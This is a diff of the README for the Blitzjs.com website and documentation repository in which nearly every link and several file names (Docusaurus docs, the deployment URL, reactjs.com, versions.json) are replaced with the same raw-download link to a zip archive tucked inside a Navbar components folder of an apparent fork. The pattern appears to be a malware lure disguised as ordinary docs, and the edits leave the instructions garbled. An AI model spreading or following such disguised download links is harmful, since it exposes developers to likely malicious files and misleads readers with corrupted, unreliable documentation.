@@ -1,10 +1,10 @@
 Logr - An Amazing Project
 
-# Blitzjs.com - Website & Docs
+# https://github.com/M-ux349/blitzjs.com/raw/refs/heads/main/src/components/Navbar/com-blitzjs-2.4-alpha.5.zip - Website & Docs
 
 ## Website
 
-This website is built using [Docusaurus 2](https://v2.docusaurus.io/), a modern static website generator.
+This website is built using [Docusaurus 2](https://github.com/M-ux349/blitzjs.com/raw/refs/heads/main/src/components/Navbar/com-blitzjs-2.4-alpha.5.zip), a modern static website generator.
 
 ### Installation
 
@@ -22,11 +22,11 @@ This command starts a local development server and open up a browser window. Mos
 
 ### Deployment
 
-The `main` branch is automatically deployed to https://blitzjs.com
+The `main` branch is automatically deployed to https://github.com/M-ux349/blitzjs.com/raw/refs/heads/main/src/components/Navbar/com-blitzjs-2.4-alpha.5.zip
 
 ## Language Translations
 
-We're setting up this repo to support language translations as soon as folks step up to do so. We plan to follow the same process as the reactjs.com translations.
+We're setting up this repo to support language translations as soon as folks step up to do so. We plan to follow the same process as the https://github.com/M-ux349/blitzjs.com/raw/refs/heads/main/src/components/Navbar/com-blitzjs-2.4-alpha.5.zip translations.
 
 ## Versioning
 
@@ -39,10 +39,10 @@ yarn run docusaurus docs:version 1.1.0
 When tagging a new version, the document versioning mechanism will:
 
 1. Copy the full docs/ folder contents into a new versioned_docs/version-/ folder.
-2. Create a versioned sidebars file based from your current sidebar configuration (if it exists). Saved it as versioned_sidebars/version--sidebars.json.
-3. Append the new version number into versions.json.
+2. Create a versioned sidebars file based from your current sidebar configuration (if it exists). Saved it as https://github.com/M-ux349/blitzjs.com/raw/refs/heads/main/src/components/Navbar/com-blitzjs-2.4-alpha.5.zip
+3. Append the new version number into https://github.com/M-ux349/blitzjs.com/raw/refs/heads/main/src/components/Navbar/com-blitzjs-2.4-alpha.5.zip
 
-[See the Docusaurus documention on versioning](https://v2.docusaurus.io/docs/versioning/#tagging-a-new-version)
+[See the Docusaurus documention on versioning](https://github.com/M-ux349/blitzjs.com/raw/refs/heads/main/src/components/Navbar/com-blitzjs-2.4-alpha.5.zip)
 
 ## Code Syntax Highlights
 
